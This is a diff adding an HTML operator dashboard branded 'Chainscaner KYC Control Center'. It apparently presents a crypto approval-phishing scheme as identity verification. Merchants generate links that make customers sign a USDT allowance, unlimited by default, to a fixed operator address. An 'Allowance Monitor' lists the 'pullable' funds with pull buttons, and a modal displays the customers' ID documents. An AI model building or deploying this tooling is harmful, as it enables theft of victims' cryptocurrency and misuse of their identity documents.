@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>KYC Control Center — Chainscaner</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  :root { color-scheme: dark; }
+  body { font-family: system-ui, -apple-system, sans-serif; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 24px; }
+  .btn-primary { background: #1f6feb; color: white; font-weight: 600; padding: 10px 20px; border-radius: 8px; transition: all 0.2s; font-size: 14px; }
+  .btn-primary:hover:not(:disabled) { background: #388bfd; }
+  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+  .btn-secondary { background: #30363d; color: white; font-weight: 600; padding: 10px 20px; border-radius: 8px; transition: all 0.2s; font-size: 14px; }
+  .btn-secondary:hover { background: #3a404a; }
+  .btn-danger { background: #da3633; color: white; font-weight: 600; padding: 8px 16px; border-radius: 6px; font-size: 13px; transition: all 0.2s; }
+  .btn-danger:hover:not(:disabled) { background: #f85149; }
+  .btn-danger:disabled { opacity: 0.5; cursor: not-allowed; }
+  input[type="text"], input[type="password"] { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #e6edf3; padding: 10px 14px; width: 100%; font-size: 14px; font-family: ui-monospace, monospace; }
+  input:focus { outline: none; border-color: #1f6feb; }
+  label { display: block; font-size: 12px; color: #8b949e; margin-bottom: 6px; font-weight: 500; }
+  .link-box { background: #0d1117; border: 1px solid #1f6feb; border-radius: 8px; padding: 12px; font-family: ui-monospace, monospace; font-size: 12px; word-break: break-all; color: #79c0ff; }
+  .hidden { display: none; }
+  .tab-btn { padding: 10px 20px; border-radius: 8px 8px 0 0; font-size: 13px; font-weight: 600; color: #8b949e; background: transparent; border: 1px solid transparent; border-bottom: none; cursor: pointer; transition: all 0.2s; }
+  .tab-btn.active { color: #e6edf3; background: #161b22; border-color: #30363d; }
+  .tab-btn:hover:not(.active) { color: #e6edf3; }
+  .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
+  .status-pending { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
+  .status-verified { background: #23863622; color: #238636; border: 1px solid #23863644; }
+  .status-expired { background: #f8514922; color: #f85149; border: 1px solid #f8514944; }
+  .session-row { display: grid; grid-template-columns: 2fr 1.5fr 1.5fr 1fr 1fr auto; gap: 12px; align-items: center; padding: 14px 0; border-bottom: 1px solid #21262d; font-size: 13px; }
+  .session-row:last-child { border-bottom: 0; }
+  .mono { font-family: ui-monospace, monospace; font-size: 12px; }
+  #log { font-family: ui-monospace, monospace; font-size: 12px; color: #3fb950; max-height: 160px; overflow-y: auto; background: #010409; border: 1px solid #30363d; border-radius: 8px; padding: 12px; }
+  .approval-row { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr auto; gap: 12px; align-items: center; padding: 12px 0; border-bottom: 1px solid #21262d; }
+  .approval-row:last-child { border-bottom: 0; }
+  .kpi-strip { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 16px; }
+  .kpi { background: #0d1117; border: 1px solid #30363d; border-radius: 10px; padding: 12px 14px; }
+  .kpi .k { display: block; font-size: 10px; letter-spacing: .08em; text-transform: uppercase; color: #8b949e; margin-bottom: 4px; }
+  .kpi .v { font-family: ui-monospace, monospace; font-size: 16px; font-weight: 600; color: #e6edf3; }
+  .kpi .v.good { color: #3fb950; }
+  .amt-input { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #e6edf3; padding: 6px 10px; width: 96px; font: 12px ui-monospace, monospace; }
+  .amt-input:focus { outline: none; border-color: #1f6feb; }
+  .amt-input:disabled { opacity: .4; }
+  .sess-pull { font-family: ui-monospace, monospace; font-size: 11px; color: #3fb950; margin-top: 2px; }
+  .pull-btn { transition: all .15s; }
+  .pull-btn:hover:not(:disabled) { transform: translateY(-1px); }
+  .pull-btn:active:not(:disabled) { transform: scale(.97); }
+  @media (max-width: 700px) {
+    .kpi-strip { grid-template-columns: 1fr 1fr; }
+    .approval-row { grid-template-columns: 1fr 1fr; row-gap: 8px; }
+  }
+
+  .feed-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid #21262d; font-size: 13px; }
+  .feed-row:last-child { border-bottom: 0; }
+  .feed-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .dot-ok { background: #3fb950; }
+  .dot-err { background: #f85149; }
+  .feed-err .feed-label { color: #ff7b72; }
+  .feed-label { flex: 1; color: #e6edf3; }
+  .feed-time { color: #8b949e; font-family: ui-monospace, monospace; font-size: 12px; }
+  .brand-icon { width:30px; height:30px; border-radius:9px; flex:none;
+    background:linear-gradient(135deg,#2563EB,#1D4ED8);
+    display:inline-flex; align-items:center; justify-content:center;
+    box-shadow:0 2px 8px rgba(37,99,235,.25); }
+  .brand-tag { font-size:8.5px; font-weight:700; letter-spacing:1.7px; text-transform:uppercase; color:#8b949e; margin-top:3px; display:block; }
+</style>
+</head>
+<body class="bg-[#0d1117] text-[#e6edf3] min-h-screen">
+
+<!-- Merchant gate — covers everything until /api/merchant verify passes -->
+<div id="gate" style="position:fixed; inset:0; z-index:50; background:#0d1117; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:14px;">
+  <div style="width:36px; height:36px; border:3px solid #30363d; border-top-color:#0a5cff; border-radius:50%; animation:gatespin 0.8s linear infinite;"></div>
+  <div id="gate-msg" class="text-[#8b949e] text-sm">Verifying merchant session…</div>
+  <button id="gate-retry" class="btn-secondary" style="display:none; padding:8px 16px; font-size:13px;">Retry</button>
+</div>
+<style>@keyframes gatespin { to { transform: rotate(360deg); } }</style>
+
+<div class="max-w-5xl mx-auto py-8 px-4">
+
+  <!-- Header -->
+  <div class="flex items-center justify-between mb-8">
+    <div class="flex items-center gap-4">
+      <span class="brand-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg></span>
+      <div>
+        <div class="font-extrabold tracking-tight" style="font-size:16px; line-height:1.1;">chain<span style="color:#4c8dff">scan</span>er<span class="brand-tag">One scan ahead.</span></div>
+        <p class="text-[#8b949e] text-sm mt-1">KYC Control Center · TRON Mainnet · USDT</p>
+      </div>
+    </div>
+    <div class="flex items-center gap-3">
+      <div class="status-badge status-pending" id="merchant-badge">Merchant</div>
+      <button id="merchant-logout" class="btn-secondary" style="padding:6px 12px; font-size:12px;">Sign out</button>
+    </div>
+  </div>
+
+  <!-- Tabs -->
+  <div class="flex border-b border-[#30363d] mb-6">
+    <button class="tab-btn active" data-tab="links">Verification Links</button>
+    <button class="tab-btn" data-tab="approvals">Allowance Monitor</button>
+    <button class="tab-btn" data-tab="sessions">Active Sessions</button>
+  </div>
+
+  <!-- Tab: Verification Links -->
+  <div id="tab-links" class="tab-content">
+
+    <!-- Create Link -->
+    <div class="card mb-6">
+      <h2 class="text-base font-semibold mb-4">Create Verification Link</h2>
+      <div class="mb-4">
+        <label>Spender Address — fixed (server operator, signs the pull)</label>
+        <input type="text" id="spender-addr" value="TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA" readonly style="opacity:.75; cursor:default" />
+        <div id="spender-status" class="text-xs text-[#8b949e] mt-1"></div>
+      </div>
+      <div class="mb-4">
+        <label>Approve Amount — what the Ledger will sign</label>
+        <input type="text" id="approve-amt" inputmode="decimal" placeholder="Unlimited — or USDT amount, e.g. 200" />
+        <div id="approve-amt-hint" class="text-xs text-[#8b949e] mt-1"></div>
+      </div>
+      <div class="grid grid-cols-2 gap-4 mb-4">
+        <div>
+          <label>From — Your company</label>
+          <input type="text" id="from-name" placeholder="e.g. Acme GmbH" />
+        </div>
+        <div>
+          <label>To — Customer name</label>
+          <input type="text" id="to-name" placeholder="e.g. Max Mustermann" />
+        </div>
+      </div>
+      <div class="flex gap-3">
+        <button id="generate-link" class="btn-primary">Generate Link</button>
+        <div class="flex items-center gap-2 text-xs text-[#8b949e]">
+          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/></svg>
+          Valid for 30 minutes after first open
+        </div>
+      </div>
+
+      <div id="link-result" class="hidden mt-5">
+        <label>Generated verification link</label>
+        <div class="link-box" id="generated-link"></div>
+        <div class="flex gap-3 mt-3">
+          <button id="copy-link" class="btn-secondary">Copy Link</button>
+          <a id="preview-link" target="_blank" class="btn-primary" style="text-decoration:none; display:flex; align-items:center">Preview</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Generated Links Table -->
+    <div class="card">
+      <h2 class="text-base font-semibold mb-4">Generated Links</h2>
+      <div class="session-row text-xs text-[#8b949e] uppercase tracking-wider">
+        <div>Customer</div>
+        <div>From</div>
+        <div>Email</div>
+        <div>Status</div>
+        <div>Certificate</div>
+        <div></div>
+      </div>
+      <div id="links-table">
+        <div class="text-[#8b949e] text-sm py-8 text-center">No links generated yet</div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Tab: Allowance Monitor -->
+  <div id="tab-approvals" class="tab-content hidden">
+
+    <div class="card mb-6">
+      <h2 class="text-base font-semibold mb-4">Monitoring</h2>
+      <p class="text-xs text-[#8b949e] mb-4">Read-only on-chain queries — no key needed. Pull is signed server-side by the fixed operator wallet.</p>
+      <div class="mb-4">
+        <label>Spender Address — fixed server operator</label>
+        <div id="spender-addr-mirror" class="mono text-xs" style="padding:10px 12px; background:#0d1117; border:1px solid #30363d; border-radius:8px; color:#8b949e; word-break:break-all;">Not set</div>
+        <div id="op-hint" class="text-xs mt-2" style="color:#8b949e"></div>
+        <div id="op-balance" class="mono text-xs mt-2" style="color:#8b949e"></div>
+      </div>
+      <div class="flex gap-3 mt-4">
+        <button id="save-spender" class="btn-primary">Refresh Approvals</button>
+        <button id="load-events" class="btn-secondary" style="display:none">Refresh Events</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="flex items-center justify-between mb-4">
+        <h2 class="text-base font-semibold">Detected Approvals</h2>
+        <div id="scan-status" class="text-xs text-[#8b949e]">—</div>
+      </div>
+      <div class="kpi-strip" aria-live="polite">
+        <div class="kpi"><span class="k">Σ pullbar</span><span class="v good" id="kpi-sum">—</span></div>
+        <div class="kpi"><span class="k">Pullbar</span><span class="v" id="kpi-count">—</span></div>
+        <div class="kpi"><span class="k">Wallets</span><span class="v" id="kpi-total">—</span></div>
+      </div>
+      <div class="approval-row text-xs text-[#8b949e] uppercase tracking-wider">
+        <div>Owner</div>
+        <div>Allowance</div>
+        <div>Balance</div>
+        <div>Pullable</div>
+        <div></div>
+      </div>
+      <div id="approvals-table">
+        <div class="text-[#8b949e] text-sm py-8 text-center">No approvals detected</div>
+      </div>
+    </div>
+
+    <div class="card mt-6">
+      <h2 class="text-base font-semibold mb-4">Activity Log</h2>
+      <div id="log"></div>
+    </div>
+
+  </div>
+
+  <!-- Tab: Active Sessions -->
+  <div id="tab-sessions" class="tab-content hidden">
+
+    <div class="card mb-6">
+      <h2 class="text-base font-semibold mb-4">Live Activity <span style="font-size:11px;color:#3fb950;font-weight:400">● live</span></h2>
+      <div id="live-feed">
+        <div class="text-[#8b949e] text-sm py-6 text-center">Waiting for customer activity…</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2 class="text-base font-semibold mb-4">Verification Sessions</h2>
+      <div id="sessions-table">
+        <div class="text-[#8b949e] text-sm py-8 text-center">No active sessions</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ID Documents lightbox — front/back from /api/kycdoc (60 min TTL) -->
+<div id="doc-modal" style="position:fixed;inset:0;z-index:60;background:rgba(1,4,9,.85);display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px);">
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:14px;max-width:920px;width:100%;max-height:90vh;overflow:auto;padding:20px;box-shadow:0 20px 60px rgba(0,0,0,.5);">
+    <div class="flex items-center justify-between mb-4">
+      <h3 style="font-size:15px;font-weight:600;">ID Documents <span id="doc-sess" class="mono text-xs" style="color:#8b949e;"></span></h3>
+      <button id="doc-close" class="btn-secondary" style="padding:6px 14px;font-size:12px;">Close</button>
+    </div>
+    <div id="doc-body" style="display:grid;grid-template-columns:1fr 1fr;gap:14px;"></div>
+  </div>
+</div>
+
+<script type="module" src="/ledger/dashboard-bundle.js"></script>
+</body>
+</html>
